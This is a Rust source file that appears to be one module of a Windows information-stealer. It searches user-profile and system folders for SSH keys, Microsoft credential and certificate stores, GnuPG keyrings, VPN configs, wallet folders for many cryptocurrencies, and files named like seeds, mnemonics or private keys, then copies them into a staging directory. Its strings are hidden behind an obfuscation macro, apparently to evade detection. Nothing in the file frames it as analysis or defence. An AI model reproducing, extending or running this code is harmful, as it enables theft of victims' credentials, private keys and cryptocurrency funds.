use crate::sprotect;
use std::fs;
use std::path::PathBuf;
use crate::docs::file_types::{is_crypto_file, has_sensitive_name};

fn copy_file_if_exists(src: &PathBuf, dest_dir: &PathBuf, category: &str) -> bool {
    if src.exists() && src.is_file() {
        if let Ok(metadata) = fs::metadata(src) {
            let file_size = metadata.len();
            if file_size > 0 && file_size < 50_000_000 {
                if let Some(filename) = src.file_name() {
                    let category_dir = dest_dir.join(category);
                    if fs::create_dir_all(&category_dir).is_ok() {
                        let dest_path = category_dir.join(filename);
                        return fs::copy(src, dest_path).is_ok();
                    }
                }
            }
        }
    }
    false
}

fn scan_directory_crypto(dir: &PathBuf, dest_dir: &PathBuf, category: &str, max_depth: u32, current_depth: u32) -> u32 {
    if current_depth >= max_depth || !dir.exists() {
        return 0;
    }
    
    let mut files_copied = 0;
    
    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            
            if path.is_file() {
                let path_str = path.to_string_lossy().to_string();
                if is_crypto_file(&path_str) || has_sensitive_name(&path_str) {
                    if copy_file_if_exists(&path, dest_dir, category) {
                        files_copied += 1;
                    }
                }
                
                if files_copied >= 200 {
                    break;
                }
            } else if path.is_dir() && current_depth < max_depth - 1 {
                let dirname = path.file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or("")
                    .to_lowercase();
                
                let skip_dirs = vec![
                    sprotect!("temp"), sprotect!("cache"), sprotect!("logs"),
                    sprotect!("windows"), sprotect!("system32"), sprotect!("program files"),
                ];
                
                if !skip_dirs.iter().any(|skip| dirname.contains(skip.as_str())) {
                    files_copied += scan_directory_crypto(&path, dest_dir, category, max_depth, current_depth + 1);
                }
            }
        }
    }
    
    files_copied
}

async fn extract_ssh_keys(dest_dir: &PathBuf) -> u32 {
    let mut files_copied = 0;
    
    if let Ok(userprofile) = std::env::var(sprotect!("USERPROFILE")) {
        let ssh_paths = vec![
            PathBuf::from(&userprofile).join(sprotect!(".ssh")),
            PathBuf::from(&userprofile).join(sprotect!("ssh")),
            PathBuf::from(&userprofile).join(sprotect!("Documents\\.ssh")),
            PathBuf::from(&userprofile).join(sprotect!("Desktop\\.ssh")),
        ];
        
        for ssh_path in ssh_paths {
            if ssh_path.exists() {
                files_copied += scan_directory_crypto(&ssh_path, dest_dir, &sprotect!("SSH"), 2, 0);
            }
        }
    }
    
    files_copied
}

async fn extract_ssl_certificates(dest_dir: &PathBuf) -> u32 {
    let mut files_copied = 0;
    
    if let Ok(userprofile) = std::env::var(sprotect!("USERPROFILE")) {
        let base_path = PathBuf::from(&userprofile);
        
        let cert_paths = vec![
            base_path.join(sprotect!("AppData\\Roaming\\Microsoft\\Crypto")),
            base_path.join(sprotect!("AppData\\Local\\Microsoft\\Credentials")),
            base_path.join(sprotect!("AppData\\Roaming\\Microsoft\\SystemCertificates")),
            base_path.join(sprotect!("Documents\\certificates")),
            base_path.join(sprotect!("Desktop\\certificates")),
        ];
        
        for cert_path in cert_paths {
            if cert_path.exists() {
                files_copied += scan_directory_crypto(&cert_path, dest_dir, &sprotect!("Certificates"), 3, 0);
            }
        }
    }
    
    let system_cert_paths = vec![
        PathBuf::from(sprotect!("C:\\ProgramData\\Microsoft\\Crypto")),
        PathBuf::from(sprotect!("C:\\Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Crypto")),
    ];
    
    for sys_cert_path in system_cert_paths {
        if sys_cert_path.exists() {
            files_copied += scan_directory_crypto(&sys_cert_path, dest_dir, &sprotect!("SystemCertificates"), 2, 0);
        }
    }
    
    files_copied
}

async fn extract_crypto_wallets(dest_dir: &PathBuf) -> u32 {
    let mut files_copied = 0;
    
    if let Ok(userprofile) = std::env::var(sprotect!("USERPROFILE")) {
        let base_path = PathBuf::from(&userprofile);
        
        let wallet_paths = vec![
            base_path.join(sprotect!("AppData\\Roaming\\Bitcoin")),
            base_path.join(sprotect!("AppData\\Roaming\\Litecoin")),
            base_path.join(sprotect!("AppData\\Roaming\\Ethereum")),
            base_path.join(sprotect!("AppData\\Roaming\\Exodus")),
            base_path.join(sprotect!("AppData\\Roaming\\Electrum")),
            base_path.join(sprotect!("AppData\\Roaming\\atomic")),
            base_path.join(sprotect!("AppData\\Roaming\\Coinomi")),
            base_path.join(sprotect!("AppData\\Roaming\\Guarda")),
            base_path.join(sprotect!("AppData\\Roaming\\DashCore")),
            base_path.join(sprotect!("AppData\\Roaming\\Zcash")),
            base_path.join(sprotect!("AppData\\Roaming\\bitmonero")),
            base_path.join(sprotect!("AppData\\Roaming\\DogeCoin")),
            base_path.join(sprotect!("AppData\\Roaming\\WalletWasabi")),
            base_path.join(sprotect!("AppData\\Roaming\\Jaxx")),
            base_path.join(sprotect!("AppData\\Roaming\\MultiBit")),
            base_path.join(sprotect!("AppData\\Roaming\\Armory")),
            base_path.join(sprotect!("Documents\\wallets")),
            base_path.join(sprotect!("Desktop\\wallets")),
            base_path.join(sprotect!("Downloads\\wallets")),
        ];
        
        for wallet_path in wallet_paths {
            if wallet_path.exists() {
                let wallet_name_str = sprotect!("CryptoWallet");
                let wallet_name = wallet_path.file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or(&wallet_name_str);
                files_copied += scan_directory_crypto(&wallet_path, dest_dir, wallet_name, 3, 0);
            }
        }
    }
    
    files_copied
}

async fn extract_pgp_keys(dest_dir: &PathBuf) -> u32 {
    let mut files_copied = 0;
    
    if let Ok(userprofile) = std::env::var(sprotect!("USERPROFILE")) {
        let pgp_paths = vec![
            PathBuf::from(&userprofile).join(sprotect!("AppData\\Roaming\\gnupg")),
            PathBuf::from(&userprofile).join(sprotect!(".gnupg")),
            PathBuf::from(&userprofile).join(sprotect!("Documents\\pgp")),
            PathBuf::from(&userprofile).join(sprotect!("Desktop\\pgp")),
            PathBuf::from(&userprofile).join(sprotect!("Documents\\keys")),
            PathBuf::from(&userprofile).join(sprotect!("Desktop\\keys")),
        ];
        
        for pgp_path in pgp_paths {
            if pgp_path.exists() {
                files_copied += scan_directory_crypto(&pgp_path, dest_dir, &sprotect!("PGP"), 2, 0);
            }
        }
    }
    
    files_copied
}

async fn extract_vpn_configs(dest_dir: &PathBuf) -> u32 {
    let mut files_copied = 0;
    
    if let Ok(userprofile) = std::env::var(sprotect!("USERPROFILE")) {
        let base_path = PathBuf::from(&userprofile);
        
        let vpn_paths = vec![
            base_path.join(sprotect!("AppData\\Roaming\\OpenVPN")),
            base_path.join(sprotect!("AppData\\Local\\NordVPN")),
            base_path.join(sprotect!("AppData\\Local\\ProtonVPN")),
            base_path.join(sprotect!("AppData\\Roaming\\ExpressVPN")),
            base_path.join(sprotect!("Documents\\vpn")),
            base_path.join(sprotect!("Desktop\\vpn")),
        ];
        
        for vpn_path in vpn_paths {
            if vpn_path.exists() {
                files_copied += scan_directory_crypto(&vpn_path, dest_dir, &sprotect!("VPN"), 2, 0);
            }
        }
    }
    
    let system_vpn_paths = vec![
        PathBuf::from(sprotect!("C:\\Program Files\\OpenVPN\\config")),
        PathBuf::from(sprotect!("C:\\Program Files (x86)\\OpenVPN\\config")),
        PathBuf::from(sprotect!("C:\\ProgramData\\OpenVPN")),
    ];
    
    for sys_vpn_path in system_vpn_paths {
        if sys_vpn_path.exists() {
            files_copied += scan_directory_crypto(&sys_vpn_path, dest_dir, &sprotect!("SystemVPN"), 1, 0);
        }
    }
    
    files_copied
}

async fn extract_keystore_files(dest_dir: &PathBuf) -> u32 {
    let mut files_copied = 0;
    
    if let Ok(userprofile) = std::env::var(sprotect!("USERPROFILE")) {
        let base_path = PathBuf::from(&userprofile);
        
        let keystore_dirs = vec![
            base_path.join(sprotect!("Documents")),
            base_path.join(sprotect!("Desktop")),
            base_path.join(sprotect!("Downloads")),
            base_path.join(sprotect!("AppData\\Roaming")),
        ];
        
        for keystore_dir in keystore_dirs {
            if keystore_dir.exists() {
                if let Ok(entries) = fs::read_dir(&keystore_dir) {
                    for entry in entries.flatten().take(500) {
                        let path = entry.path();
                        if path.is_file() {
                            let filename = path.file_name()
                                .and_then(|n| n.to_str())
                                .unwrap_or("")
                                .to_lowercase();
                            
                            let keystore_patterns = vec![
                                sprotect!("keystore"), sprotect!("keys"), sprotect!("wallet"),
                                sprotect!("backup"), sprotect!("private"), sprotect!("secret"),
                                sprotect!("seed"), sprotect!("mnemonic"), sprotect!("recovery"),
                            ];
                            
                            if keystore_patterns.iter().any(|pattern| filename.contains(pattern.as_str())) {
                                let path_str = path.to_string_lossy().to_string();
                                if is_crypto_file(&path_str) || has_sensitive_name(&path_str) {
                                    if copy_file_if_exists(&path, dest_dir, &sprotect!("Keystore")) {
                                        files_copied += 1;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    files_copied
}

pub async fn extract_crypto_keys() -> Result<(), Box<dyn std::error::Error>> {
    let base_output = PathBuf::from(sprotect!("C:\\temp\\extract\\docs"));
    fs::create_dir_all(&base_output).ok();
    
    let mut total_extracted = 0;
    
    total_extracted += extract_ssh_keys(&base_output).await;
    total_extracted += extract_ssl_certificates(&base_output).await;
    total_extracted += extract_crypto_wallets(&base_output).await;
    total_extracted += extract_pgp_keys(&base_output).await;
    total_extracted += extract_vpn_configs(&base_output).await;
    total_extracted += extract_keystore_files(&base_output).await;
    
    if total_extracted == 0 {
        fs::remove_dir_all(&base_output).ok();
    }
    
    Ok(())
}